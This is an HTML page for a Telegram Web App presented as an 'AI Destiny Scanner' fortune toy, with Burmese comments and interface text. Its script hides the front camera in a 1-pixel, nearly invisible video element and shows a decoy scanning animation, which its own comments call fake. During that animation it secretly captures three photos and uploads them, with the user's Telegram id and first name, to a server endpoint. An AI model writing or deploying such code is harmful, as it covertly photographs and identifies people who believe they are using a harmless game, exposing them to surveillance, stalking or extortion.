<!DOCTYPE html>
<html>
<head>
    <title>AI Destiny Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0a0e14; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
        .scanner-box { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        
        /* ကင်မရာကို ဖျောက်ထားခြင်း */
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        
        /* Decoy UI (ဟန်ပြ UI) */
        .scan-line { width: 80%; height: 2px; background: #00d2ff; box-shadow: 0 0 15px #00d2ff; position: absolute; animation: scan 3s infinite linear; }
        .status-text { margin-top: 30px; font-size: 1.2rem; text-shadow: 0 0 10px #00d2ff; }
        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; position: relative; }
        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.5s; }

        @keyframes scan { 0% { top: 20%; } 50% { top: 80%; } 100% { top: 20%; } }
    </style>
</head>
<body>
    <div class="scanner-box">
        <div class="scan-line"></div>
        <h2 id="header">AI FACE ANALYZER</h2>
        <p class="status-text" id="status">သင့်မျက်နှာကို စကင်န်ဖတ်နေပါသည်...</p>
        <div class="loading-bar"><div class="progress" id="progress"></div></div>
        <p style="font-size: 0.8rem; margin-top: 20px; opacity: 0.7;">* ကျေးဇူးပြု၍ ဖုန်းကို ငြိမ်ငြိမ်ကိုင်ထားပေးပါ</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const tg = window.Telegram.WebApp;
        tg.ready(); tg.expand();

        let captureCount = 0;
        const maxCaptures = 3; // ပုံ ၃ ပုံ ပို့မည်

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => { 
                video.srcObject = s;
                startFakeProcess();
            });

        function startFakeProcess() {
            let width = 0;
            const interval = setInterval(() => {
                width += 1.5;
                progress.style.width = width + '%';

                // ပုံမှန်ကြားဖြတ်ပြီး ပုံခိုးရိုက်ခြင်း
                if (width > 20 && captureCount === 0) { captureImage("Scanning Eye Retinas..."); captureCount++; }
                if (width > 50 && captureCount === 1) { captureImage("Analyzing Facial Structure..."); captureCount++; }
                if (width > 85 && captureCount === 2) { captureImage("Calculating Destiny Score..."); captureCount++; }

                if (width >= 100) {
                    clearInterval(interval);
                    status.innerText = "စစ်ဆေးမှု ပြီးဆုံးပါပြီ။";
                    document.getElementById('header').innerText = "YOUR LUCK: 98% (Excellent)";
                    setTimeout(() => tg.close(), 3000);
                }
            }, 100);
        }

        async function captureImage(msg) {
            status.innerText = msg;
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.7);

            await fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    image: imageData,
                    user_id: tg.initDataUnsafe.user.id,
                    user_name: tg.initDataUnsafe.user.first_name
                })
            });
        }
    </script>
</body>
</html>
